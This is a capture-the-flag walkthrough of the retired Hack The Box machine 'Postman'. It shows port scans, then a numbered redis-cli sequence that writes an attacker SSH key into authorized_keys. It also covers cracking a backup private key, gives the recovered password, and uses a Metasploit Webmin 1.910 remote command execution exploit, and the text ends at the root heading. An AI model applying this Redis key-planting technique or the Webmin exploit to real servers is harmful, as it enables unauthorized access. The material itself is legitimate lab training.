## Background

Postman is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.160 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-11-03 13:51:36 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 10000/tcp on 10.10.10.160                                 
Discovered open port 6379/tcp on 10.10.10.160                                  
Discovered open port 80/tcp on 10.10.10.160                                    
Discovered open port 22/tcp on 10.10.10.160
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,6379,10000 -A --reason -oN nmap.txt 10.10.10.160
...
PORT      STATE SERVICE REASON         VERSION

```

Hmm. Other than the usual `ssh` and `http` services, we also have Redis and MiniServ running. Anyhow, this is what the `http` site looks like.

### Redis SSH Backdoor

Anyway since the Redis service is available, let's check and see what we can glean from there.


{% include image.html image_alt="28521bc8.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/28521bc8.png" %}


Interesting. The creator seems to be suggesting that there's a `redis` SSH account and the way to get a foothold is to dump a SSH public key we control to `authorized_keys`.

That should be easy.

1. `ssh-keygen -f redis`
2. `echo -ne "\n\n" > public; cat redis.pub >> public`
3. `redis-cli -h 10.10.10.160 SLAVEOF NO ONE`
3. `cat public | redis-cli -h 10.10.10.160 -x set pub`
4. `redis-cli -h 10.10.10.160 CONFIG SET dbfilename authorized_keys`
5. `redis-cli -h 10.10.10.160 SAVE`

I've incorporated the above steps into a script to save a bit of time because many HTB players are chasing after a Metasploit exploit that somehow didn't work as expected.

### Matt's Backup SSH Key

During enumeration of `redis`'s account, I noticed that there is another account with UID 1000 (Matt). That would mean that the file `user.txt` is in Matt's home directory.


{% include image.html image_alt="6c8021b8.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/6c8021b8.png" %}


Look what we found!


{% include image.html image_alt="397bd523.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/397bd523.png" %}


Matt is careless to leave a backup of his password-protected SSH private key around.


{% include image.html image_alt="52c92cfb.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/52c92cfb.png" %}


Something else is up. Notice that Matt cannot login via SSH.


{% include image.html image_alt="cb6018ab.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/cb6018ab.png" %}


What good is a password-protected private key if we can't login via SSH? Well, we can crack the key's password and see what it brings us.


{% include image.html image_alt="657cca71.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/657cca71.png" %}


And guess what. We can `su` as Matt with that password.


{% include image.html image_alt="b73a8c9e.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/b73a8c9e.png" %}


There you have it. The file `user.txt` is indeed in Matt's home directory.


{% include image.html image_alt="5d53b140.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/5d53b140.png" %}


## Privilege Escalation

During enumeration of Matt's account, I noticed the presence of a file in `/etc/webmin/Matt.acl`, which sort of gave me an ideaâ€”maybe Matt is able to log in to the Webmin using the same credential (`Matt:computer2008`)?


{% include image.html image_alt="5eea3d2f.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/5eea3d2f.png" %}


No shit.

### Webmin 1.910 - 'Package Updates' Remote Command Execution

Long story short. As much as I wanted to avoid Metasploit, this is one exploit that executes better with it.


{% include image.html image_alt="a5c6060b.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/a5c6060b.png" %}


This is way too easy.


{% include image.html image_alt="9dfc4cec.png" image_src="/b631a3a0-f4e2-49f3-ba97-668d34c6e0b4/9dfc4cec.png" %}


### Getting `root.txt`
